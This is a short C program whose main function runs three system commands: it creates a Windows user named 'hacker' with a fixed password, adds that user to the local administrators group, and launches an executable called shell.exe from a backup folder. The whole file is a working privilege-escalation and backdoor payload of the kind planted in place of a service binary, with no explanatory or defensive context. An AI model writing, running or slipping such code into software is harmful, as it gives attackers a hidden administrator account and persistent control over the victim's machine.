#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user hacker password123! /add");
  i = system ("net localgroup administrators hacker /add");
  i = system ("c:\\backup\\shell.exe");
  
  return 0;
}